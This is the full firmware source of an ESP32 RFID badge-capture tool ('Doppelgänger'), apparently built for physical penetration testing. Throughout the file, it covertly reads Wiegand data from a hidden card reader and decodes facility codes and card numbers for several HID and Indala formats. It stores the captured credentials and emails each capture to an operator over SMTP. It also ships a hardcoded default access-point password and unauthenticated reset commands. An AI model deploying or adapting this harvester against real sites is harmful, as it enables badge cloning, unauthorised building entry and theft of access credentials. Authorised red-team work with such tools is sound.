/*
 * Doppelgänger RFID Suite || Version 2.0
 *
 * Written by Travis Weathers
 * GitHub: https://github.com/tweathers-sec/
 * Note: I'm not a developer, and the code is likely garbage.
 *
 * This project stemmed from the RPi chip shortage, which drove up the cost of RPi Nano W boards.
 * In addtion, there were some limitations with existing tooling that I aimed to mitigate.
 *
 * My intent with this project was to accomplish the following:
 *
 * 1) Reduce the amount of wiring/soldering required to go operational. This was marginally successful.
 * 2) Use modern CoTS equipment that can easily be replaced.
 * 3) The operator can't go into a comms blackhole when connected to the device.
 * 4) Egress for notifications, reducing the need to check for card reads while in the middle of an operation.
 * 5) Simplified WebGUI that only displays Bit Length, Facility Code, and Card Number. Option to download the complete data set(e.g., BL, FC, CC, HEX, BIN).
 * 6) Error handling, so the device doesn't log bad reads, EMI, etc.
 * 7) Easy configuration and reset functionality for team use.
 *
 * Special thanks to the following folks for doing all of the heavy lifting with the original research,
 * development and Wiegand code refreshing. With this project, I merely created a method of delivery that suits my team's needs.
 *
 * Francis Brown of BishopFox - To this day, "RFID Hacking Live Free or RFID Hard" remains my favorite
 * conference talk. Watching that talk blew my mind as I left the military many years ago and started penetration testing. Truly inspirational!
 * studebacon - Without stumbling across your Tastic refresh, I may not have invested the time building this out.
 * Daniel Smith - For laying so much of the groundwork that has made all of these awesome tools possible.
 *
 * Checkout the following links; they're worth your time:
 * https://bishopfox.com/blog/tastic-rfid-thief-silent-deadly
 * https://github.com/studebacon/TasticCodeUpdate (Wiegand processing code in Doppelgänger originates from this repo)
 * https://www.pagemac.com/projects/rfid/hid_data_formats
 */

///////////////////////////////////////////////////////
// Load the libraries that we require
#include <FS.h>
#include <LittleFS.h>
#include <ArduinoJson.h>
#include <WiFiManager.h>
#include <ESP_Mail_Client.h>
#include <ESPAsyncWebServer.h>
#include <WebSocketsServer.h>
#include <ESPmDNS.h>
#include <Arduino.h>

///////////////////////////////////////////////////////
// Wiegand Configurations
#define MAX_BITS 100           // Max number of bits
#define WEIGAND_WAIT_TIME 3000 // Time to wait for another weigand pulse.
#define DATA0 26               // Pin Header for DATA0 Connetion (IoT Redboard = 26 | Thing Plus C = 26)
#define DATA1 25               // Pin Header for DATA1 Connetion (IoT Redboard = 27 | Thing Plus C = 25)
const int C_PIN_LED = 13;      // LED indicator for config mode (IOT Redboard = 18 | Thing Plus C = 13)

unsigned char databits[MAX_BITS]; // Stores all of the data bits
volatile unsigned int bitCount = 0;
unsigned char flagDone;       // Goes low when data is currently being captured
unsigned int weigand_counter; // Countdown until we assume there are no more bits

volatile unsigned long facilityCode = 0; // Decoded facility code
volatile unsigned long cardNumber = 0;   // Decoded card number

// Breaking up card value into 2 chunks to create 10 char HEX value
volatile unsigned long bitHolder1 = 0;
volatile unsigned long bitHolder2 = 0;
volatile unsigned long cardChunk1 = 0;
volatile unsigned long cardChunk2 = 0;

///////////////////////////////////////////////////////
// File Configuration
#define FORMAT_LITTLEFS_IF_FAILED true
#define JSON_CONFIG_FILE "/www/config.json"
#define CARDS_CSV_FILE "/www/cards.csv"

///////////////////////////////////////////////////////
// WiFiManager Configurations
const char *defaultPASS = "UndertheRadar";
#define prefixSSID "doppelgänger_"

// #define defaultSSID "doppelgänger"
// #define defaultPASS "UndertheRadar"
#define portalTimeout 120 // Device reboots after X seconds if no configuration is entered
#define connectTimeout 30 // Enters configuration mode if device can't find previously stored AP in X seconds
#define LED_ON HIGH
#define LED_OFF LOW

bool enable_email = false;
char smtp_host[25] = "smtp.<domain>.com";
char smtp_port[5] = "465";
char smtp_user[35] = "<sender_email>@<domain>.com";
char smtp_pass[20] = "AppPassword";
char smtp_recipient[35] = "<phonenumber>@<carrierdomain>.com";

uint16_t smtp_port_x;

bool shouldSaveConfig = false;

WiFiManager wifiManager;

///////////////////////////////////////////////////////
// mDNS Configuration
#define mdnsHost "RFID"

///////////////////////////////////////////////////////
// Webserver Configuration
AsyncWebServer server(80);
WebSocketsServer websockets(81);

///////////////////////////////////////////////////////
// ESP Mail Client Configuration
SMTPSession smtp;

///////////////////////////////////////////////////////
// Functions start here
///////////////////////////////////////////////////////
// Write default configuration
void setDefaultConfig()
{
  Serial.println("======================================");
  Serial.println("[CONFIG] Writing the default configuration...");
  JsonDocument json;

  json["enable_email"] = "false";
  json["smtp_host"] = "smtp.<domain>.com";
  json["smtp_port"] = "465";
  json["smtp_user"] = "<sender_email>@<domain>.com";
  json["smtp_pass"] = "AppPassword";
  json["smtp_recipient"] = "<phonenumber>@<carrierdomain>.com";

  File configFile = LittleFS.open(JSON_CONFIG_FILE, "w");
  if (!configFile)
  {
    Serial.println("[CONFIG] Failed to open configuration file for writing");
  }

  serializeJsonPretty(json, Serial);
  if (serializeJson(json, configFile) == 0)
  {
    Serial.println(F("[CONFIG] Failed to write data to config file"));
  }
  configFile.close();
}

// Read Notification Configuration
void readConfig()
{
  Serial.println("======================================");
  File loadConfig = LittleFS.open(JSON_CONFIG_FILE, "r");

  if (loadConfig)
  {
    Serial.println("[CONFIG] Loading notification preferences...");
    JsonDocument json;
    DeserializationError error = deserializeJson(json, loadConfig);
    serializeJsonPretty(json, Serial);
    if (!error)
    {
      const char *enable_email_str = json["enable_email"];
      if (enable_email_str != nullptr)
      {
        enable_email = strcmp(enable_email_str, "true") == 0;
      }
      strcpy(smtp_host, json["smtp_host"]);
      strcpy(smtp_port, json["smtp_port"]);
      strcpy(smtp_user, json["smtp_user"]);
      strcpy(smtp_pass, json["smtp_pass"]);
      strcpy(smtp_recipient, json["smtp_recipient"]);
      Serial.println("");
    }
    else
    {
      Serial.println("[CONFIG] Failed to open configuration file");
      return;
    }
  }
}

// WebSocket Event Handler
void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload, size_t length)
{

  switch (type)
  {
  case WStype_DISCONNECTED:
    break;
  case WStype_CONNECTED:
  {
    IPAddress ip = websockets.remoteIP(num);
    websockets.sendTXT(num, "Connected to Doppelgänger server.");
  }
  break;
  case WStype_TEXT:
    Serial.println("======================================");
    Serial.printf("[WEBSOCKET] Client sent instructions: ");
    String message = String((char *)(payload));
    Serial.println(message);

    JsonDocument doc;
    DeserializationError error = deserializeJson(doc, message);

    if (error)
    {
      Serial.print("[WEBSOCKET] deserializeJson() failed: ");
      Serial.println(error.c_str());
      return;
    }

    bool erase_cards = doc["WIPE_CARDS"];
    bool restore_config = doc["WIPE_CONFIG"];
    bool reset_wireless = doc["WIPE_WIFI"];
    bool factory_reset = doc["WIPE_DEVICE"];
    String notification_settings = doc["enable_email"];

    if (erase_cards)
    {
      Serial.println("[WEBSOCKET] Clearing stored cards from the device...");
      LittleFS.remove(CARDS_CSV_FILE);
      delay(1000);
      File csvCards = LittleFS.open(CARDS_CSV_FILE, "w");
      csvCards.close();

      Serial.println("[WEBSOCKET] Stored card data has been cleared.");
    }

    if (restore_config)
    {
      Serial.println("[WEBSOCKET] Restoring configuration file to factory...");
      LittleFS.remove(JSON_CONFIG_FILE);
      delay(1000);
      File jsonConfig = LittleFS.open(JSON_CONFIG_FILE, "w");
      jsonConfig.close();
      setDefaultConfig();
      Serial.println("");
      Serial.println("[WEBSOCKET] Notification preferences have been restored.");
      readConfig();
    }

    if (reset_wireless)
    {
      Serial.println("[WEBSOCKET] Removing stored wireless credentials...");
      wifiManager.resetSettings();
      Serial.println("[WEBSOCKET] Stored wireless credentials have been removed. Restarting the device.");
      delay(3000);
      ESP.restart();
    }

    if (factory_reset)
    {
      Serial.println("[WEBSOCKET] Clearing stored cards from the device...");
      LittleFS.remove(CARDS_CSV_FILE);
      delay(1000);
      File csvCards = LittleFS.open(CARDS_CSV_FILE, "w");
      csvCards.close();

      Serial.println("[WEBSOCKET] Stored card data has been cleared.");

      LittleFS.remove(JSON_CONFIG_FILE);
      delay(1000);
      File jsonConfig = LittleFS.open(JSON_CONFIG_FILE, "w");
      jsonConfig.close();
      setDefaultConfig();
      Serial.println("");
      Serial.println("[WEBSOCKET] Notification preferences have been restored.");
      delay(1000);

      wifiManager.resetSettings();
      Serial.println("[WEBSOCKET] Reset device to factory defaults. Restarting the device.");
      delay(3000);
      ESP.restart();
    }

    if (notification_settings == "true" || notification_settings == "false")
    {
      Serial.println("======================================");
      Serial.println("[WEBSOCKET] Saving the following configuration to memory...");

      File configFile = LittleFS.open(JSON_CONFIG_FILE, "w");
      if (!configFile)
      {
        Serial.println("[WEBSOCKET] Failed to open configuration file for writing");
      }

      serializeJsonPretty(doc, Serial);
      if (serializeJson(doc, configFile) == 0)
      {
        Serial.println(F("[WEBSOCKET] Failed to write data to config file"));
      }
      configFile.close();
      Serial.println("");
      Serial.println("[WEBSOCKET] File successfully written");
      readConfig();
    }
    doc.clear();
  }
}

// Callback function to get email status
void smtpCallback(SMTP_Status status);

// Interrupt that happens when INTO goes low (0 bit)
void ISR_INT0()
{
  bitCount++;
  flagDone = 0;

  if (bitCount < 23)
  {
    bitHolder1 = bitHolder1 << 1;
  }
  else
  {
    bitHolder2 = bitHolder2 << 1;
  }

  weigand_counter = WEIGAND_WAIT_TIME;
}

// Interrupt that happens when INT1 goes low (1 bit)
void ISR_INT1()
{
  databits[bitCount] = 1;
  bitCount++;
  flagDone = 0;

  if (bitCount < 23)
  {
    bitHolder1 = bitHolder1 << 1;
    bitHolder1 |= 1;
  }
  else
  {
    bitHolder2 = bitHolder2 << 1;
    bitHolder2 |= 1;
  }

  weigand_counter = WEIGAND_WAIT_TIME;
}

void setup()
{
  // PIN illumination for when the device is in configuration mode
  pinMode(C_PIN_LED, OUTPUT);

  // Start the Serial console
  Serial.begin(115200);
  delay(10);

  ///////////////////////////////////////////////////////
  // Wiegand Configuration
  ///////////////////////////////////////////////////////
  Serial.println("======================================");
  pinMode(DATA0, INPUT); // DATA0 (INT0)
  pinMode(DATA1, INPUT); // DATA1 (INT1)
  Serial.print("[GPIO] Setting DATA0 to pin: ");
  Serial.println(DATA0);
  Serial.print("[GPIO] Setting DATA1 to pin: ");
  Serial.println(DATA1);
  Serial.println("[GPIO] Ground should be conntected to GND");

  // Binds the ISR functions to INTO and INT1
  attachInterrupt(DATA0, ISR_INT0, FALLING);
  attachInterrupt(DATA1, ISR_INT1, FALLING);
  weigand_counter = WEIGAND_WAIT_TIME;

  Serial.println("======================================");
  Serial.println("[FILESYSTEM] Initializing the filesystem...");
  if (!LittleFS.begin(FORMAT_LITTLEFS_IF_FAILED))
  {
    Serial.println("[FILESYSTEM] LittleFS Mount Failed");
    return;
  }

  ///////////////////////////////////////////////////////
  // WiFiManager configurations & setup
  ///////////////////////////////////////////////////////
  uint8_t mac[6];
  WiFi.macAddress(mac);

  // Set the unique SSID
  char lastFourDigits[5];
  sprintf(lastFourDigits, "%02X%02X", mac[4], mac[5]);
  String defaultSSID = prefixSSID + String(lastFourDigits);

  wifiManager.setHostname("rfid");
  wifiManager.setConfigPortalTimeout(portalTimeout);
  wifiManager.setMinimumSignalQuality(25);
  wifiManager.setDebugOutput(true);
  wifiManager.setConnectTimeout(connectTimeout);
  wifiManager.setScanDispPerc(true);
  wifiManager.setSaveConfigCallback([]()
                                    {
      shouldSaveConfig = true;
      // need to reboot after config to free up port 80 for the webserver
      ESP.restart(); });

  // Customize the WiFiManager menu a bit
  std::vector<const char *> menu = {"wifi", "wifinoscan", "sep", "info", "update", "sep", "restart", "exit"};
  wifiManager.setMenu(menu);

  Serial.println("======================================");
  digitalWrite(C_PIN_LED, LED_ON);

  // if (!wifiManager.autoConnect(defaultSSID, defaultPASS))
  if (!wifiManager.autoConnect(defaultSSID.c_str(), defaultPASS))
  {
    Serial.println("[WIFI] Failed to connect to stored Wireless network and hit timeout");
    delay(3000);
    ESP.restart();
    delay(5000);
  }

  // Load stored stored configuration
  readConfig();

  ///////////////////////////////////////////////////////
  // Setup mDNS - drfid.local
  ///////////////////////////////////////////////////////
  Serial.println("======================================");
  if (MDNS.begin(mdnsHost))
  {
    Serial.println("[NETWORK] The mDNS service is running");
  }

  ///////////////////////////////////////////////////////
  // Show the console the networking information
  ///////////////////////////////////////////////////////
  Serial.println("======================================");
  Serial.print("[WIFI] Connected to: ");
  Serial.println(WiFi.SSID());
  Serial.print("[WIFI] IP Address: ");
  Serial.println(WiFi.localIP());
  Serial.print("[WIFI] Gateway: ");
  Serial.println(WiFi.gatewayIP());
  Serial.print("[WIFI] Mac Address: ");
  Serial.println(WiFi.macAddress());
  Serial.print("[WIFI] RSSI: ");
  Serial.println(WiFi.RSSI());

  ///////////////////////////////////////////////////////
  // Standup the webserver
  ///////////////////////////////////////////////////////
  Serial.println("======================================");
  Serial.println("[WEBSERVER] Starting web services");
  DefaultHeaders::Instance().addHeader("Access-Control-Allow-Origin", "*");
  DefaultHeaders::Instance().addHeader("Access-Control-Allow-Methods", "GET");
  DefaultHeaders::Instance().addHeader("Access-Control-Allow-Headers", "*");

  server.serveStatic("/", LittleFS, "/www/").setDefaultFile("index.html");

  server.onNotFound([](AsyncWebServerRequest *request)
                    {
    if (request->method() == HTTP_OPTIONS)
    {
      request->send(200);
    }
    else
    {
      Serial.println("[WEBSERVER] 404 sent to client");
      request->send(404, "Not Found");
    } });

  server.begin();
  Serial.println("[WEBSERVER] Webserver is running");
  websockets.begin();
  websockets.onEvent(webSocketEvent);
  Serial.println("[WEBSERVER] WebSocket service is running");
  Serial.print("[WEBSERVER] Doppelgänger: http://");
  Serial.print(mdnsHost);
  Serial.println(".local/");

  ///////////////////////////////////////////////////////
  // Get the current time
  ///////////////////////////////////////////////////////
  Serial.println("======================================");
  unsigned long ms = millis();

  Serial.println("[NTP] Waiting for NTP server to synchronize.");

  configTime(3, 0, "pool.ntp.org", "time.nist.gov");
  ms = millis();

  while (millis() - ms < 10000 && time(nullptr) < ESP_TIME_DEFAULT_TS)
  {
    Serial.print(".");
    delay(300);
  }
  Serial.println("");

  time_t now = time(nullptr);
  Serial.print("[NTP] The current time is: ");
  Serial.print(ctime(&now));

  ///////////////////////////////////////////////////////
  // Notifications settings
  ///////////////////////////////////////////////////////
  Serial.println("======================================");

  if (enable_email)
  {
    Serial.print("[EMAIL] Notifications will be sent to: ");
    Serial.println(smtp_recipient);
  }
  else
  {
    Serial.println("[EMAIL] Notifications are currently disabled.");
  }

  digitalWrite(C_PIN_LED, LED_OFF);
}

///////////////////////////////////////////////////////
// ESP Email Client Functions
void sendCardsEmail()
{
  Serial.println("======================================");
  Serial.println("[EMAIL] Preparing to send card data.");

  smtp.debug(0);
  smtp.callback(smtpCallback);
  Session_Config session;

  // Set the deets needed for sending
  smtp_port_x = atoi(smtp_port);
  session.server.host_name = smtp_host;
  session.server.port = smtp_port_x;
  session.login.email = smtp_user;
  session.login.password = smtp_pass;
  session.login.user_domain = "";

  SMTP_Message message;

  // Message Headers
  message.sender.name = mdnsHost;
  message.sender.email = smtp_user;
  message.subject = "!! Data Received !!";
  message.addRecipient("RFID Notification", smtp_recipient);

  // Send raw text message
  String textMsg = String("\n\nBL: ") + String(bitCount) + String("\nFC: ") + String(facilityCode) + String("\nCN: ") + String(cardNumber);

  message.text.content = textMsg.c_str();
  message.text.charSet = "us-ascii";
  message.text.transfer_encoding = Content_Transfer_Encoding::enc_7bit;

  message.priority = esp_mail_smtp_priority::esp_mail_smtp_priority_low;
  message.response.notify = esp_mail_smtp_notify_success | esp_mail_smtp_notify_failure | esp_mail_smtp_notify_delay;

  // Connect to server with the session config
  if (!smtp.connect(&session))
    return;

  // Send the email and close the session
  if (!MailClient.sendMail(&smtp, &message))
    Serial.println("[Email] Error sending Email, " + smtp.errorReason());
}

void smtpCallback(SMTP_Status status)
{
  // Print the results
  if (status.success())
  {
    struct tm dt;

    for (size_t i = 0; i < smtp.sendingResult.size(); i++)
    {
      SMTP_Result result = smtp.sendingResult.getItem(i);
      time_t ts = (time_t)result.timestamp;
      localtime_r(&ts, &dt);

      ESP_MAIL_PRINTF("Message No: %d\n", i + 1);
      ESP_MAIL_PRINTF("Status: %s\n", result.completed ? "success" : "failed");
      ESP_MAIL_PRINTF("Date/Time: %d/%d/%d %d:%d:%d\n", dt.tm_year + 1900, dt.tm_mon + 1, dt.tm_mday, dt.tm_hour, dt.tm_min, dt.tm_sec);
      ESP_MAIL_PRINTF("Recipient: %s\n", result.recipients.c_str());
      ESP_MAIL_PRINTF("Subject: %s\n", result.subject.c_str());
    }
    Serial.println("======================================");
  }
}

///////////////////////////////////////////////////////
// Card logging
void writeCSVLog()
{
  Serial.print("[CARD LOG] Logging card data to ");
  Serial.println(CARDS_CSV_FILE);
  File csvCards = LittleFS.open(CARDS_CSV_FILE, "a");

  if (!csvCards)
  {
    Serial.print("[CARD LOG] There was an error opening ");
    Serial.println(CARDS_CSV_FILE);
    return;
  }
  else
  {
    csvCards.print("Bit_Length: ");
    csvCards.print(bitCount);
    csvCards.print(", Hex_Value: ");
    csvCards.print(cardChunk1, HEX);
    csvCards.print(cardChunk2, HEX);
    csvCards.print(", Facility_Code: ");
    csvCards.print(facilityCode, DEC);
    csvCards.print(", Card_Number: ");
    csvCards.print(cardNumber, DEC);
    csvCards.print(", BIN: ");
    for (int i = 19; i >= 0; i--)
    {
      csvCards.print(bitRead(cardChunk1, i));
    }
    for (int i = 23; i >= 0; i--)
    {
      csvCards.print(bitRead(cardChunk2, i));
    }
    csvCards.print("\n");
  }
  csvCards.close();
}

///////////////////////////////////////////////////////
// Serial Console Logging & Error Handling
void consoleLog()
{
  Serial.println("======================================");
  if (facilityCode > 0)
  {
    Serial.print("[CARD READ] Card Bits: ");
    Serial.print(bitCount);
    Serial.print(", FC = ");
    Serial.print(facilityCode);
    Serial.print(", CN = ");
    Serial.print(cardNumber);
    Serial.print(", HEX = ");
    Serial.print(cardChunk1, HEX);
    Serial.println(cardChunk2, HEX);
  }
  else
  {
    Serial.println("[CARD READ] ERROR: Bad Card Read! Card data won't be added to the web log.");
    Serial.println("[CARD READ] POSSIBLE ISSUES:");
    Serial.println("[CARD READ]    (1) Card passed through the reader too quickly");
    Serial.println("[CARD READ]    (2) Loose GPIO connection(s)");
    Serial.println("[CARD READ]    (3) Electromagnetic interference (EMI)");
    Serial.println("[CARD READ]    (4) No available parser for card. Data will be stored within the CSV file.");
    Serial.println("[CARD READ] Below is the bad data:");
    Serial.print("[CARD READ] Card Bits: ");
    Serial.print(bitCount);
    Serial.print(", FC = ");
    Serial.print(facilityCode);
    Serial.print(", CN = ");
    Serial.print(cardNumber);
    Serial.print(", HEX = ");
    Serial.print(cardChunk1, HEX);
    Serial.println(cardChunk2, HEX);
  }
}

///////////////////////////////////////////////////////
// Wiegand data flow and processing
void getFacilityCodeCardNumber()
{
  unsigned char i;

  // Cards will be decoded differently depending on Bit Length
  // Reference: http://www.pagemac.com/projects/rfid/hid_data_formats
  // Reference: https://www.brivo.com/resources/card-calculator/

  switch (bitCount)
  {

  // Standard HID H10301 26-bit
  case 26:
    for (i = 1; i < 9; i++)
    {
      facilityCode <<= 1;
      facilityCode |= databits[i];
    }

    for (i = 9; i < 25; i++)
    {
      cardNumber <<= 1;
      cardNumber |= databits[i];
    }
    break;

    // Indala 27-bit (Not Tested)
  case 27:
    for (i = 1; i < 13; i++)
    {
      facilityCode <<= 1;
      facilityCode |= databits[i];
    }

    for (i = 14; i < 27; i++)
    {
      cardNumber <<= 1;
      cardNumber |= databits[i];
    }
    break;

  // Indala 29-bit (Not Tested)
  case 29:
    for (i = 1; i < 13; i++)
    {
      facilityCode <<= 1;
      facilityCode |= databits[i];
    }

    for (i = 14; i < 29; i++)
    {
      cardNumber <<= 1;
      cardNumber |= databits[i];
    }
    break;

  // Generic HID 33-bit
  case 33:
    for (i = 1; i < 8; i++)
    {
      facilityCode <<= 1;
      facilityCode |= databits[i];
    }

    for (i = 8; i < 32; i++)
    {
      cardNumber <<= 1;
      cardNumber |= databits[i];
    }
    break;

  // Generic HID H10306 34-bit
  case 34:
    for (i = 1; i < 17; i++)
    {
      facilityCode <<= 1;
      facilityCode |= databits[i];
    }

    for (i = 17; i < 33; i++)
    {
      cardNumber <<= 1;
      cardNumber |= databits[i];
    }
    break;

  // HID Corporate 1000 35-bit
  case 35:
    for (i = 2; i < 14; i++)
    {
      facilityCode <<= 1;
      facilityCode |= databits[i];
    }

    for (i = 14; i < 34; i++)
    {
      cardNumber <<= 1;
      cardNumber |= databits[i];
    }
    break;

  // HID H10304 37-bit
  case 37:
    for (i = 2; i < 17; i++)
    {
      facilityCode <<= 1;
      facilityCode |= databits[i];
    }

    for (i = 18; i < 36; i++)
    {
      cardNumber <<= 1;
      cardNumber |= databits[i];
    }
    break;
  }
  return;
}

void getCardValues()
{
  switch (bitCount)
  {
  case 26:

    for (int i = 19; i >= 0; i--)
    {
      if (i == 13 || i == 2)
      {
        bitWrite(cardChunk1, i, 1);
      }
      else if (i > 2)
      {
        bitWrite(cardChunk1, i, 0);
      }
      else
      {
        bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 20));
      }
      if (i < 20)
      {
        bitWrite(cardChunk2, i + 4, bitRead(bitHolder1, i));
      }
      if (i < 4)
      {
        bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
      }
    }
    break;

  case 27:
    for (int i = 19; i >= 0; i--)
    {
      if (i == 13 || i == 3)
      {
        bitWrite(cardChunk1, i, 1);
      }
      else if (i > 3)
      {
        bitWrite(cardChunk1, i, 0);
      }
      else
      {
        bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 19));
      }
      if (i < 19)
      {
        bitWrite(cardChunk2, i + 5, bitRead(bitHolder1, i));
      }
      if (i < 5)
      {
        bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
      }
    }
    break;

  case 28:
    for (int i = 19; i >= 0; i--)
    {
      if (i == 13 || i == 4)
      {
        bitWrite(cardChunk1, i, 1);
      }
      else if (i > 4)
      {
        bitWrite(cardChunk1, i, 0);
      }
      else
      {
        bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 18));
      }
      if (i < 18)
      {
        bitWrite(cardChunk2, i + 6, bitRead(bitHolder1, i));
      }
      if (i < 6)
      {
        bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
      }
    }
    break;

  case 29:
    for (int i = 19; i >= 0; i--)
    {
      if (i == 13 || i == 5)
      {
        bitWrite(cardChunk1, i, 1);
      }
      else if (i > 5)
      {
        bitWrite(cardChunk1, i, 0);
      }
      else
      {
        bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 17));
      }
      if (i < 17)
      {
        bitWrite(cardChunk2, i + 7, bitRead(bitHolder1, i));
      }
      if (i < 7)
      {
        bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
      }
    }
    break;

  case 30:
    for (int i = 19; i >= 0; i--)
    {
      if (i == 13 || i == 6)
      {
        bitWrite(cardChunk1, i, 1);
      }
      else if (i > 6)
      {
        bitWrite(cardChunk1, i, 0);
      }
      else
      {
        bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 16));
      }
      if (i < 16)
      {
        bitWrite(cardChunk2, i + 8, bitRead(bitHolder1, i));
      }
      if (i < 8)
      {
        bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
      }
    }
    break;

  case 31:
    for (int i = 19; i >= 0; i--)
    {
      if (i == 13 || i == 7)
      {
        bitWrite(cardChunk1, i, 1);
      }
      else if (i > 7)
      {
        bitWrite(cardChunk1, i, 0);
      }
      else
      {
        bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 15));
      }
      if (i < 15)
      {
        bitWrite(cardChunk2, i + 9, bitRead(bitHolder1, i));
      }
      if (i < 9)
      {
        bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
      }
    }
    break;

  case 32:
    for (int i = 19; i >= 0; i--)
    {
      if (i == 13 || i == 8)
      {
        bitWrite(cardChunk1, i, 1);
      }
      else if (i > 8)
      {
        bitWrite(cardChunk1, i, 0);
      }
      else
      {
        bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 14));
      }
      if (i < 14)
      {
        bitWrite(cardChunk2, i + 10, bitRead(bitHolder1, i));
      }
      if (i < 10)
      {
        bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
      }
    }
    break;

  case 33:
    for (int i = 19; i >= 0; i--)
    {
      if (i == 13 || i == 9)
      {
        bitWrite(cardChunk1, i, 1);
      }
      else if (i > 9)
      {
        bitWrite(cardChunk1, i, 0);
      }
      else
      {
        bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 13));
      }
      if (i < 13)
      {
        bitWrite(cardChunk2, i + 11, bitRead(bitHolder1, i));
      }
      if (i < 11)
      {
        bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
      }
    }
    break;

  case 34:
    for (int i = 19; i >= 0; i--)
    {
      if (i == 13 || i == 10)
      {
        bitWrite(cardChunk1, i, 1);
      }
      else if (i > 10)
      {
        bitWrite(cardChunk1, i, 0);
      }
      else
      {
        bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 12));
      }
      if (i < 12)
      {
        bitWrite(cardChunk2, i + 12, bitRead(bitHolder1, i));
      }
      if (i < 12)
      {
        bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
      }
    }
    break;

  case 35:
    for (int i = 19; i >= 0; i--)
    {
      if (i == 13 || i == 11)
      {
        bitWrite(cardChunk1, i, 1);
      }
      else if (i > 11)
      {
        bitWrite(cardChunk1, i, 0);
      }
      else
      {
        bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 11));
      }
      if (i < 11)
      {
        bitWrite(cardChunk2, i + 13, bitRead(bitHolder1, i));
      }
      if (i < 13)
      {
        bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
      }
    }
    break;

  case 36:
    for (int i = 19; i >= 0; i--)
    {
      if (i == 13 || i == 12)
      {
        bitWrite(cardChunk1, i, 1);
      }
      else if (i > 12)
      {
        bitWrite(cardChunk1, i, 0);
      }
      else
      {
        bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 10));
      }
      if (i < 10)
      {
        bitWrite(cardChunk2, i + 14, bitRead(bitHolder1, i));
      }
      if (i < 14)
      {
        bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
      }
    }
    break;

  case 37:
    for (int i = 19; i >= 0; i--)
    {
      if (i == 13)
      {
        bitWrite(cardChunk1, i, 0);
      }
      else
      {
        bitWrite(cardChunk1, i, bitRead(bitHolder1, i + 9));
      }
      if (i < 9)
      {
        bitWrite(cardChunk2, i + 15, bitRead(bitHolder1, i));
      }
      if (i < 15)
      {
        bitWrite(cardChunk2, i, bitRead(bitHolder2, i));
      }
    }
    break;
  }
  return;
}

///////////////////////////////////////
// Main loop for processing card data, logging, and send e-mails
///////////////////////////////////////

void loop()
{
  //   Pause before moving forward
  if (!flagDone)
  {

    if (--weigand_counter == 0)
      flagDone = 1;
  }

  // Check for weigand pulse
  if (bitCount > 0 && flagDone)
  {
    unsigned char i;

    getCardValues();
    getFacilityCodeCardNumber();
    consoleLog();

    // Only send an e-mail and add data to web log on valid card reads
    if (facilityCode > 0 && cardNumber > 0)
    {
      // writeJSONWeb();
      if (enable_email)
      {
        sendCardsEmail();
      }
    }
    // Send all raw data to the CSV file
    writeCSVLog();

    // Cleanup and get ready for the next card
    bitCount = 0;
    facilityCode = 0;
    cardNumber = 0;
    bitHolder1 = 0;
    bitHolder2 = 0;
    cardChunk1 = 0;
    cardChunk2 = 0;

    for (i = 0; i < MAX_BITS; i++)
    {
      databits[i] = 0;
    }
  }
  websockets.loop();
}